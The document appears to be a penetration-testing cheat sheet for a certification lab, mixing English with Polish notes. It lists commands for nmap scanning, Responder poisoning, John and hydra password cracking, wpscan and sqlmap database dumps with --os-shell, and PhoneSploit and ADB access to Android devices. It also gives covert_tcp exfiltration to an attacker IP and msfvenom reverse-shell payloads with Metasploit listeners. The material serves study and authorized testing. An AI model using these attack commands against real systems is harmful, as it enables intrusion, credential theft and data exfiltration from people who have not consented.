## CYBERTOOLS
basic commands for tools

## nmap
nmap - to find services open on server

To scan the live Host
```console
nmap -sP x.x.x.1/24                 
nmap -sn x.x.x.1/24
```
* -sn: To nowa wersja składni "Ping Scan" (dawniej -sP). Oznacza "Disable Port Scanning", co znaczy, że Nmap nie wykonuje skanowania portów, a jedynie sprawdza, czy hosty są aktywne w danej podsieci.

To find the Specific open port 
```console
nmap -p port x.x.x.1/24 --open
```
To find the OS 
```console
nmap -O -sV x.x.x.x 
```
Find the FQDN in a subnet/network
```console
nmap -p389 –sV -iL <target_list>  or nmap -p389 –sV <target_IP> 
``` 

To perform a port and service discovery scan.
```console
nmap -T4 -A -v www.example.com
``` 
* -T4: specifies setting time template (0-5),
* -A: specifies aggressive scan,
* -v: enables the verbose output (include all hosts and ports in the output).

To Perform LDAP enumeration on the target network and find out how many user accounts are associated with the domain. 

```console
nmap 10.10.10.25 --script=*user*
``` 

Comprehensive Scan

```console
nmap -Pn -A x.x.x.1/24 -vv --open   
```
* -Pn
Wyłącza pingowanie hostów przed skanowaniem (oznacza: "Treat all hosts as online").
Domyślnie Nmap sprawdza, czy hosty są aktywne, wysyłając zapytania ICMP (ping) lub inne testy. Przy użyciu -Pn narzędzie zakłada, że wszystkie hosty w danym zakresie x.x.x.1/24 są dostępne i przystępuje do skanowania nawet, jeśli ping ICMP jest zablokowany przez zaporę sieciową (firewall).
* -A
Aktywuje szczegółowe skanowanie i umożliwia:
Wykrywanie systemu operacyjnego (OS Detection),
Wykrywanie usług na otwartych portach (Service Version Detection),
Śledzenie trasy (traceroute),
Pobieranie dodatkowych informacji o hostach (np. banery aplikacji).
Opcja ta jest przydatna do głębokiej analizy hostów w sieci.
* -vv
Ustawia wysoki poziom szczegółowości w wyjściu (Verbose Mode).
-vv oznacza "Very Verbose", dzięki czemu Nmap generuje więcej informacji w czasie rzeczywistym podczas wykonywania skanowania.
* --open
Wyświetla tylko hosty i porty, które są otwarte.
Ignoruje porty zamknięte lub filtrowane, aby skupić się wyłącznie na tych, które mogą świadczyć usługi lub być potencjalnie dostępne.

## ldapsearch
To perform an LDAP Search on the Domain Controller machine and find out the version of the LDAP protocol

```console
ldapsearch -x -H ldap://10.10.10.25
```

## netdiscover
netdiscover - to find active machines

```console
netdiscover -i eth0     
netdiscover -r x.x.x.1/24
```
* -i eth0: Określa interfejs sieciowy, na którym ma działać narzędzie, w tym przypadku eth0 (tryb pasywny)
* -r x.x.x.1/24: Określa zakres adresów IP, który ma być aktywnie skanowany (tryb aktywny)

##  LLMNR/NBT-NS Poisoning
This can be used to get the already logged-in user's password, who is trying to access a shared resource which is not present.
```console
responder -I eth0  
```
* -I eth0 - Responder zaczyna nasłuchiwać ruchu LLMNR, NBT-NS i MDNS na interfejsie eth0.

 In windows, try to access the shared resource, logs are stored at usr/share/responder/logs/SMB<filename>

## John The Ripper
* To crack SMB hash

```console
john SMBfilename  
```
* To crack NTLM hash using wordlist
```console
john ~/Documents/hashes.txt --format=NT --wordlist ~/Desktop/Wordlist/password.txt
```
## l0phtCrack
* To audit WINDOWS passwords: l0phtCrack –> Password Auditing Wizard –> next –> next –> A remote machine –> Host(IP.ADDRESS) –> Use Specifc User Credentials –>


## hydra

hydra - to bruteforce usernames and passwords.

```console
hydra -L userlist.txt -P passlist.txt ftp://x.x.x.x
```
* If the service isn't running on the default port, use -s
```console
hydra -L userlist.txt -P passlist.txt ftp://x.x.x.x -s 221
```
* Used to download the specific file from FTP to attacker or local machine
```console
get flag.txt ~/Desktop/filepath/flag.txt
get flag.txt .
```
* telnet
```console
hydra -l admin -P passlist.txt -o test.txt x.x.x.x telnet
```

## Telnet
Perform Banner grabbing on the web application WEB (ETag)

```console
telnet WEB 80 
GET / HTTP/1.0
```

## BinText
*Analyze the malware and find out the File pos for KERNEL32.dll text.

## ServiceType
*Perform windows service monitoring and find out the service type associated with display name "Name".
(Get-Service -Name "Name").ServiceType

## Whatweb
* T Perform an HTTP-recon on SITE and find out the version of Nginx used by the web server.
  
```console
whatweb SITE
```

## WGET
* To Perform an HTTP-recon on SITE and find out the version of Nginx used by the web server.
  
```console
wget -q- S SITE
```

## cURL
* Perform Web Crawling on the web application SITE and identify the number of live png files in images folder.

```console
curl SITE | grep .png | wc -l
```

## wpscan
wpscan - to bruteforce wordpress website (users and passwords)

* Wordpress site only Users Enumeration
```console
wpscan --url http://example.com/share --enumerate u
```
  * Direct crack if we have user/password detail
```console
wpscan --url http://x.x.x.x/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt
wpscan --url http://x.x.x.x:8080/SHARE -u <user> -P ~/wordlists/password.txt
```

## sqlmap
sqlmap - to find data (phones, usernames, etc) in database 
* List databases, add cookie values
```console
  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” --dbs 
```
* OR
```console
  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low”   --data="id=1&Submit=Submit" --dbs  
```

* List Tables, add databse name
```console
  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name --tables  
```
* List Columns of that table
```console
  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name -T target_Table --columns
```
* Dump all values of the table
```console
  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name -T target_Table --dump
```
* It opens up the Interactive OS shell
```console
  sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" --os-shell
```

## SQL Injection
  
  * Login bypass with [' or 1=1 --]
    
## adb
* To Install ADB
```console
apt-get update
sudo apt-get install adb -y
adb devices -l
```
* Connection Establish Steps

```console
adb connect x.x.x.x:5555
adb devices -l
adb shell  
```
* To navigate
```console
pwd
ls
cd Download
ls
cd sdcard
```
* Download a File from Android using ADB tool
```console
adb pull /sdcard/log.txt C:\Users\admin\Desktop\log.txt 
adb pull sdcard/log.txt /home/mmurphy/Desktop
```


## PhoneSploit tool
  
* To install Phonesploit 

```console
git clone https://github.com/aerosol-can/PhoneSploit
cd PhoneSploit
pip3 install colorama
OR
python3 -m pip install colorama
```
* To run Phonesploit
```console
python3 phonesploit.py
```
* Type 3 and Press Enter to Connect a new Phone OR Enter IP of Android Device
* Type 4, to Access Shell on phone
* Download File using PhoneSploit
```console
Pull Folders from Phone to PC
```
* Enter the Full Path of file to Download
```console
sdcard/Download/secret.txt
```

## hashcalc
hashcalc -  to calculate SHA1 hash

## veracrypt
veracrypt - to decrypt volume and find secret file

## BCTextEncoder
BCTextEncoder - to decode text using given secret

## Cryptool
cryptool - to decode .hex ,.dex, .oct file
*use encrypt/decrypt bar

## snow

```console
SNOW.EXE -C -p test -m "Secret Message" original.txt hide.txt
```

* To unhide the Hidden Text

```console
SNOW.EXE -C -p test hide.txt
```

## openstego
openstego - to hide secret in photo

## covert_tcp
covert_tcp - to create secret channel

 * Compile the Code
  ```console
cc -o covert_tcp covert_tcp.c
  ```
  * Sender Machine(Client_IP)
  ```console
  sudo ./covert_tcp -source Client_IP -dest Attacker_IP -source_port 9999 -dest_port 8888 -file recieve.txt
  ```
  * Reciever Machine( Attacker_IP)
  * Create A Message file that need to be transferred Eg: secret.txt
  ```console
  sudo ./covert_tcp -source Client_IP -source_port 8888 -server -file secret.txt
  ```
## Reverse Shell PHP
  
* To create a PHP Payload 
* Copy the PHP code and create a .php
  
```console
msfvenom -p php/meterpreter/reverse_tcp lhost=attacker-ip lport=attcker-port -f raw
```
  
* To create a Reverse_tcp Connection
```console
msfconsole
use exploit/multi/handler
set payload php/meterepreter/reverse_tcp
set LHOST = attacker-ip
set LPORT = attcker-port
run
```

## Meterpreter sh 

  * To create a Payload 
```console
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=attacker_IP LPORT=attacker_Port -o filename.exe 
```
* To take a reverse TCP connection from windows
```console
msfdb init && msfconsole 
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST= attacker-IP  
set LPORT= attacker-Port 
run
```

## SENDING files from Linux to Windows
* used to send a payload by Apache 
```console
mkdir /var/www/html/share
chmod -R 755 /var/www/html/share
chown -R www-data:www-data /var/www/html/share
cp /root/Desktop/filename /var/www/html/share/
  ```
  * to start and verify
  ```console
  service apache2 start 
  service apache2 status
  ```
  * to Download from Windows
  * Open browser 
  ```shell
  IP_OF_LINUX/share
  ```

## Wireshark

To find DOS (SYN and ACK) : tcp.flags.syn == 1  , tcp.flags.syn == 1 and tcp.flags.ack == 0
To find passwords : http.request.method == POST
